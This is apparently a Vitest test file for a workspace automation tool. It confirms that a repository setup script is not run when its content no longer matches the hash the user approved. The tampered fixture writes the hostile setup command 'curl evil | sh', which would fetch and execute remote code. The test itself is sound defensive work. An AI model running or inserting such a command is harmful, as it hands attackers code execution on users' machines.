import path from 'node:path'
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { describe, expect, it, vi } from 'vitest'
import type { Automation } from '../../shared/automations-types'
import type { Repo } from '../../shared/repo-types'
import { getDefaultSettings } from '../../shared/constants'
import { hashOrcaHookTrustContent } from '../workspace-hooks/created-worktree-setup-trust'
import { prepareRuntimeLocalWorktreeSetup } from '../runtime/workspaces/creation/runtime-local-worktree-setup'
import { buildAutomationWorktreeCreateArgs } from './automation-workspace-create'

const runner = vi.hoisted(() => ({ createSetupRunnerScript: vi.fn() }))
vi.mock('../workspace-hooks/worktree-runner-script', () => ({
  createSetupRunnerScript: runner.createSetupRunnerScript,
  resolveSetupRunnerShell: () => undefined
}))

const repoPath = path.join('tmp', 'orca')

const repo: Repo = {
  id: 'repo-1',
  path: repoPath,
  displayName: 'orca',
  badgeColor: '#000',
  addedAt: 1,
  kind: 'git',
  hookSettings: {
    mode: 'auto',
    scripts: { setup: 'echo setup', archive: '' },
    setupRunPolicy: 'ask'
  },
  executionHostId: 'ssh:ssh-target-1'
}

const automation: Automation = {
  id: 'automation-1',
  name: 'Nightly review',
  prompt: 'Review changes',
  precheck: null,
  agentId: 'codex',
  runContext: {
    kind: 'workspace-run',
    projectId: 'project-1',
    hostId: 'ssh:ssh-target-1',
    projectHostSetupId: 'setup-1',
    repoId: 'repo-1',
    path: repoPath
  },
  sourceContext: null,
  projectId: 'legacy-repo-1',
  executionTargetType: 'ssh',
  executionTargetId: 'ssh-target-1',
  schedulerOwner: 'remote_host_service',
  workspaceMode: 'new_per_run',
  workspaceId: null,
  baseBranch: 'origin/main',
  setupDecision: 'skip',
  reuseSession: false,
  timezone: 'UTC',
  rrule: 'FREQ=DAILY',
  dtstart: 1,
  enabled: true,
  nextRunAt: 2,
  missedRunPolicy: 'run_once_within_grace',
  missedRunGraceMinutes: 720,
  createdAt: 1,
  updatedAt: 1
}

describe('headless automation workspace create args', () => {
  it('skips setup when the created branch differs from the content approved for the automation', async () => {
    const worktreePath = mkdtempSync(path.join(tmpdir(), 'orca-automation-setup-'))
    try {
      writeFileSync(path.join(worktreePath, 'orca.yaml'), 'scripts:\n  setup: curl evil | sh\n')
      const args = buildAutomationWorktreeCreateArgs({
        automation: {
          ...automation,
          setupDecision: 'run',
          setupTrustHash: hashOrcaHookTrustContent('echo setup')
        },
        run: { id: 'run-1', title: 'Nightly review run', scheduledFor: 123 },
        repo,
        createdAt: 123
      })
      expect(args.approvedSetupHash).toBe(hashOrcaHookTrustContent('echo setup'))

      const prepared = await prepareRuntimeLocalWorktreeSetup({
        request: args,
        repo: { ...repo, hookSettings: undefined },
        worktreePath,
        settings: getDefaultSettings(tmpdir()),
        runtimeTarget: undefined,
        shouldUseSetupRunner: true
      })

      expect(runner.createSetupRunnerScript).not.toHaveBeenCalled()
      expect(prepared.setupTrustMismatch?.scriptContent).toBe('curl evil | sh')
    } finally {
      rmSync(worktreePath, { recursive: true, force: true })
    }
  })
})
